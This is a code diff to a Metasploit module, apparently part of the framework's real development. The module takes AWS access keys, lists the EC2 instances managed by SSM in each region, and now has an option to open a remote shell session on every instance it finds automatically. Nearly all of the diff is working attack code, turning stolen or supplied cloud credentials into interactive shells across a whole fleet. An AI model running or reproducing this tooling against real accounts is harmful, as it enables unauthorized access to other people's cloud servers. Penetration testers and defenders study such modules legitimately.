@@ -6,6 +6,8 @@
 require 'aws-sdk-ssm'
 
 class MetasploitModule < Msf::Auxiliary
+  include Rex::Proto::Http::WebSocket::AmazonSsm
+  include Msf::Auxiliary::CommandShell
   def initialize(info = {})
     super(
       update_info(
@@ -17,16 +19,16 @@ class MetasploitModule < Msf::Auxiliary
                           associated with the account
                          ),
         'Author'      => [
-          'Aaron Soto <aaron.soto@rapid7.com>' # EC2 enum module
+          'Aaron Soto <aaron.soto@rapid7.com>', # EC2 enum module
           'RageLtMan <rageltman[at]sempervictus>' # SSM stuff
         ],
-        'Author'      => ['Aaron Soto <aaron.soto@rapid7.com>'],
         'License'     => MSF_LICENSE
       )
     )
 
     register_options(
       [
+        OptBool.new('GET_SSM_SESSION', [true, 'Automatically get SSM sessions once found', false]),
         OptInt.new('LIMIT', [false, 'Only return the specified number of results from each region']),
         OptString.new('REGION', [false, 'AWS Region (eg. "us-west-2")']),
         OptString.new('ACCESS_KEY_ID', [true, 'AWS Access Key ID (eg. "AKIAXXXXXXXXXXXXXXXX")', '']),
@@ -64,35 +66,71 @@ class MetasploitModule < Msf::Auxiliary
     regions = datastore['REGION'] ? [datastore['REGION']] : regions = enumerate_regions()
     credentials = ::Aws::Credentials.new(datastore['ACCESS_KEY_ID'], datastore['SECRET_ACCESS_KEY'])
     regions.each do |region|
-      vprint_status "Checking #{region}..."
-      client = ::Aws::SSM::Client.new(
-        region: region,
-        credentials: credentials,
-      )
-      inv_params = { filters: [
-        {
-          key: "AWS:InstanceInformation.InstanceStatus",
-          values: ["Terminated"],
-          type: "NotEqual",
-        },
-        {
-          key: "AWS:InstanceInformation.ResourceType",
-          values: ['EC2Instance'],
-          type: "Equal",
-        }
-      ]}
-      ssm_ec2 = client.get_inventory(inv_params).entities.map {|e| e.data["AWS:InstanceInformation"].content}.flatten
-      ssm_ec2.each do |ssm_host| 
-        vprint_good JSON.pretty_generate(ssm_host)
-        # report host?
-        # report services?
-        # report notes?
-        # auto-start SSM session?
+      begin
+        vprint_status "Checking #{region}..."
+        client = ::Aws::SSM::Client.new(
+          region: region,
+          credentials: credentials,
+        )
+        inv_params = { filters: [
+          {
+            key: "AWS:InstanceInformation.InstanceStatus",
+            values: ["Terminated"],
+            type: "NotEqual",
+          },
+          {
+            key: "AWS:InstanceInformation.ResourceType",
+            values: ['EC2Instance'],
+            type: "Equal",
+          }
+        ]}
+        ssm_ec2 = client.get_inventory(inv_params).entities.map {|e| e.data["AWS:InstanceInformation"].content}.flatten
+        ssm_ec2.each do |ssm_host| 
+          vprint_good JSON.pretty_generate(ssm_host)
+          if datastore['GET_SSM_SESSION']
+            socket = get_ssm_socket(client, ssm_host['InstanceId'])
+            start_session(self, "AWS SSM #{datastore['ACCESS_KEY_ID']} (#{socket.params.peerhost}:0)", datastore, false, socket.lsock)
+          end
+          # report host?
+          # report services?
+          # report notes?
+        end
+      rescue Seahorse::Client::NetworkingError => e
+        print_error e.message
+        print_error 'Confirm region name (eg. us-west-2) is valid or blank before retrying'
+      rescue ::Exception => e
+        handle_aws_errors(e)
       end
-  rescue Seahorse::Client::NetworkingError => e
-    print_error e.message
-    print_error 'Confirm region name (eg. us-west-2) is valid or blank before retrying'
-  rescue ::Exception => e
-    handle_aws_errors(e)
+    end
+  end
+
+  def get_ssm_socket(client, ec2_id)
+    # Verify the connection params and availability of instance
+    inv_params = { filters: [
+      {
+        key: "AWS:InstanceInformation.InstanceId",
+        values: [ec2_id],
+        type: "Equal",
+      }
+    ]}
+    inventory = client.get_inventory(inv_params)
+    # Extract peer info
+    if inventory.entities[0] and inventory.entities[0].id == ec2_id
+      peer_info = inventory.entities[0].data['AWS:InstanceInformation'].content[0]
+    else
+      raise "SSM target not found"
+    end
+    session_init = client.start_session({
+      target: ec2_id,
+      document_name: 'SSM-SessionManagerRunShell'
+    })
+    ssm_sock = connect_ssm_ws(session_init)
+    chan = ssm_sock.to_ssm_channel
+    chan.params.comm = Rex::Socket::Comm::Local unless chan.params.comm
+    chan.params.peerhost = peer_info['IpAddress']
+    chan.params.peerport = 0
+    chan.params.peerhostname = peer_info['ComputerName']
+    chan.update_term_size
+    return chan
   end
 end
